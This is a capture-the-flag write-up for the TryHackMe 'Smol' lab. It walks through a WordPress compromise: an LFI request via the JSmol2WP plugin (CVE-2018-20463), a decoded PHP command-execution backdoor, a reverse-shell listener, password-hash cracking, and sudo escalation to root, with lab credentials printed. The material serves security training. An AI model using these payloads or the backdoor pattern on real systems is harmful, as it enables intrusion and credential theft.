# 🐾 TryHackMe: Smol

> **Difficulty:** Medium
> **Operating System:** Linux
> **Platform:** TryHackMe
> **Focus Areas:** WordPress Enumeration, Vulnerable Plugins, SSRF, File Disclosure, Backdoored Plugin Analysis, RCE, Password Cracking, PAM Misconfiguration & Privilege Escalation

---

## 📌 Overview

**Smol** is a Linux-based TryHackMe machine centered around a vulnerable WordPress installation. The machine demonstrates how an outdated plugin can expose sensitive files, how poor third-party plugin inspection can introduce backdoors, and how multiple small misconfigurations can eventually lead to full system compromise.

The attack path followed was:

```text
Nmap Enumeration
      ↓
WordPress Discovery
      ↓
WPScan Plugin & User Enumeration
      ↓
JSmol2WP Vulnerability Discovery
      ↓
SSRF / Local File Disclosure
      ↓
wp-config.php Credentials
      ↓
WordPress Dashboard Access
      ↓
Backdoored Plugin Source Analysis
      ↓
Remote Code Execution
      ↓
www-data Shell
      ↓
Database Enumeration
      ↓
WordPress Hash Extraction
      ↓
Password Cracking
      ↓
Diego User Access
      ↓
PAM Misconfiguration
      ↓
Gege User Access
      ↓
Password-Protected Backup Discovery
      ↓
Backup Password Cracking
      ↓
Xavi Credentials
      ↓
sudo Privilege Escalation
      ↓
ROOT
```

---

# 🔍 1. Initial Enumeration

We begin by performing a full TCP port scan against the target.

```bash
nmap -p- <TARGET-IP>
```

The scan revealed two open ports:

```text
22/tcp open  ssh
80/tcp open  http
```

Next, we performed service and version detection:

```bash
nmap -sC -sV -p 22,80 <TARGET-IP>
```

### Results

```text
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu
80/tcp open  http Apache httpd 2.4.41 (Ubuntu)
```

The HTTP service also revealed an important redirect:

```text
Did not follow redirect to http://www.smol.thm
```

This indicated that the application was using the hostname:

```text
www.smol.thm
```

We added the target hostname to `/etc/hosts` before continuing with web enumeration.

---

# 🌐 2. WordPress Enumeration

The web application appeared to be running **WordPress**, so we continued enumeration using WPScan.

```bash
wpscan --url http://www.smol.thm --api-token <API-TOKEN> -e
```

WPScan identified the following plugin:

```text
jsmol2wp
```

Location:

```text
http://www.smol.thm/wp-content/plugins/jsmol2wp/
```

Version:

```text
1.07
```

Two known vulnerabilities were identified:

```text
JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)

JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
```

The SSRF vulnerability was particularly interesting and became the main initial attack vector. WPScan also identified multiple WordPress users, including `admin`, `think`, `gege`, `diego`, and `xavi`.

---

# 📂 3. Directory and File Enumeration

We also performed directory enumeration using Gobuster.

Interesting directories included:

```text
/wp-admin
/wp-includes
/wp-content
```

Further file enumeration revealed several standard WordPress files, including:

```text
/readme.html
/license.txt
/xmlrpc.php
/wp-login.php
/wp-config.php
```

The presence of `/wp-login.php` confirmed the WordPress login interface, while the discovered vulnerable plugin remained the most promising route for initial access.

---

# 💥 4. Exploiting JSmol2WP SSRF

The identified plugin version was vulnerable to:

```text
CVE-2018-20463
```

The vulnerable endpoint allowed us to access local files through the following parameter:

```text
/wp-content/plugins/jsmol2wp/php/jsmol.php
```

The vulnerable request was:

```http
GET /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php HTTP/1.1
```

Using this, we successfully retrieved the WordPress configuration file.

Important database credentials were exposed:

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
define( 'DB_HOST', 'localhost' );
```

We now had valid database credentials:

```text
Username: wpuser
Password: kbLSF2Vop#lw3rjDZ629*Z%G
```

These credentials were then used to gain access to the WordPress dashboard.

---

# 🔎 5. Inspecting the WordPress Plugin Source

After accessing the WordPress dashboard, further investigation revealed that some content and source code required closer inspection.

A page associated with the plugin could be accessed through:

```text
http://www.smol.thm/wp-admin/post.php?post=58&action=edit
```

Using the previously discovered vulnerable JSmol2WP parameter, we were able to read additional application files.

The **Hello Dolly** plugin contained suspicious code:

```php
eval(base64_decode('...'));
```

After decoding the Base64 content, the functionality became clear:

```php
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
```

This revealed a **backdoor** that accepted a `cmd` parameter and executed its value through the PHP `system()` function.

This was the critical point where the attack moved from file disclosure to **Remote Code Execution**.

---

# 💻 6. Remote Code Execution

The backdoor allowed commands to be executed through the vulnerable WordPress administration endpoint using the `cmd` parameter.

After confirming command execution, we used the RCE to obtain a reverse shell.

A listener was started on the attacking machine:

```bash
rlwrap nc -lvnp 4444
```

The target successfully connected back:

```text
connect to [ATTACKER-IP] from (UNKNOWN) [TARGET-IP]
```

The initial shell was obtained as:

```text
www-data
```

---

# 🖥️ 7. Shell Stabilization

The initial reverse shell did not have a proper TTY.

We checked for Python:

```bash
which python3
```

Python was available:

```text
/usr/bin/python3
```

We spawned a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then backgrounded the shell and configured the terminal:

```text
CTRL + Z
```

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

The shell was now stabilized and easier to interact with.

---

# 🗄️ 8. Database Enumeration

Since we already had the MySQL credentials from `wp-config.php`, we continued by enumerating the WordPress database.

The user table revealed several WordPress users and their password hashes.

Some of the extracted hashes included:

```text
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

We saved the hashes into a file:

```bash
nano hash.txt
```

Then used John the Ripper with the RockYou wordlist:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

A password was successfully recovered:

```text
sandiegocalifornia
```

The corresponding user was:

```text
diego
```

The recovered credentials were:

```text
Username: diego
Password: sandiegocalifornia
```

We then switched from `www-data` to the `diego` user:

```bash
su diego
```

Successful user access was obtained.

---

# 👥 9. Discovering the Think User

While enumerating user directories, an interesting discovery was made: an `id_rsa` file was associated with the `think` user.

Further investigation of the PAM configuration showed:

```bash
cat /etc/pam.d/su
```

The relevant configuration contained:

```text
auth [success=ignore default=1] pam_succeed_if.so user = gege
auth sufficient pam_succeed_if.so use_uid user = think
```

This configuration was important for the next stage of lateral movement.

The machine's PAM configuration allowed the attack chain to continue through the available user relationships and authentication behavior.

---

# 🔄 10. Moving to the Gege User

Using the discovered PAM behavior, we switched to the `gege` user:

```bash
su - gege
```

We successfully obtained:

```text
gege@TARGET:~$
```

While enumerating Gege's home directory, we discovered an interesting backup archive:

```text
wordpress.old.zip
```

This appeared to contain an older copy of the WordPress installation.

---

# 🔐 11. Cracking the WordPress Backup

The ZIP archive was password protected.

We extracted its password hash using:

```bash
zip2john wordpress.old.zip > archive_hash
```

Then cracked it using John the Ripper:

```bash
john archive_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password was recovered:

```text
hero_gege@hotmail.com
```

After extracting the archive, an old WordPress configuration file was discovered.

This configuration contained another set of database credentials:

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'xavi' );
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

We now had credentials for another system user:

```text
Username: xavi
Password: P@ssw0rdxavi@
```

The backup archive therefore provided the next step in the privilege escalation chain.

---

# 🔼 12. Privilege Escalation to Xavi

Using the recovered credentials, we switched to the `xavi` user:

```bash
su xavi
```

We then checked the user's sudo permissions:

```bash
sudo -l
```

The result showed:

```text
User xavi may run the following commands on TARGET:
    (ALL : ALL) ALL
```

This meant that `xavi` could execute **any command as root**.

The final privilege escalation was straightforward:

```bash
sudo su
```

We successfully obtained:

```text
root@TARGET:~#
```

Full system compromise was achieved.

---

# 🚩 13. Root Flag

After obtaining root access, we navigated to the root directory and read the final flag:

```bash
cat /root/root.txt
```

🎉 **Root access successfully obtained!**

---

# 🧭 Complete Attack Path

```text
                    ┌─────────────────────┐
                    │    Nmap Scan        │
                    │     22 / 80         │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ WordPress Discovery │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ WPScan Enumeration  │
                    │ JSmol2WP <= 1.07    │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ SSRF / File Read    │
                    │ CVE-2018-20463      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │  wp-config.php      │
                    │ DB Credentials      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ WordPress Dashboard │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Backdoored Plugin   │
                    │ Source Inspection   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Remote Code Exec    │
                    │   www-data Shell    │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Database Enumeration│
                    │ WordPress Hashes    │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Password Cracking   │
                    │ Diego Credentials   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │     PAM Analysis    │
                    │ User Lateral Move   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │       Gege          │
                    │ wordpress.old.zip   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ ZIP Password Crack  │
                    │ Old wp-config.php   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │   Xavi Credentials  │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ sudo -l             │
                    │ (ALL : ALL) ALL     │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │        ROOT         │
                    └─────────────────────┘
```

---

# 🛠️ Tools Used

| Tool              | Purpose                                |
| ----------------- | -------------------------------------- |
| `Nmap`            | Port scanning and service enumeration  |
| `WPScan`          | WordPress, plugin and user enumeration |
| `Gobuster`        | Directory and file discovery           |
| `Burp Suite`      | Web application testing                |
| `curl`            | HTTP request testing                   |
| `John the Ripper` | Password and archive cracking          |
| `zip2john`        | Extracting ZIP password hashes         |
| `Netcat`          | Reverse shell listener                 |
| `rlwrap`          | Improving shell interaction            |
| `MySQL`           | WordPress database enumeration         |

---

# 📚 Key Takeaways

* Always begin with thorough **port and service enumeration**.
* Hostname redirects may reveal virtual hosts that need to be added to `/etc/hosts`.
* WordPress plugins should be carefully enumerated because outdated plugins can introduce serious vulnerabilities.
* Publicly known vulnerabilities such as **CVE-2018-20463** can lead to sensitive file disclosure when patching is neglected.
* Files such as `wp-config.php` contain highly sensitive database credentials and should never be exposed.
* Third-party plugins should be **manually inspected before deployment**.
* Obfuscated code such as `eval(base64_decode(...))` should always be treated as highly suspicious.
* Backdoored plugins can turn a normal WordPress compromise into full **Remote Code Execution**.
* Database access can provide valuable usernames and password hashes for lateral movement.
* Weak passwords remain vulnerable to dictionary attacks.
* PAM configurations should be carefully reviewed because authentication misconfigurations can allow unintended user switching.
* Old backups often contain valid credentials and sensitive configuration data.
* Password-protected archives are not secure if weak passwords are used.
* Always check `sudo -l` after obtaining access to a new Linux user.

---

## ⚠️ Disclaimer

> This write-up was created **solely for educational purposes** and documents actions performed against an authorized TryHackMe lab machine.
> Do not use these techniques against systems without explicit permission.

---

### 👤 Author

**Kabir**
Cybersecurity | Red Teaming | Web Security | CTF Player

⭐ If you found this write-up useful, consider giving the repository a **star**!
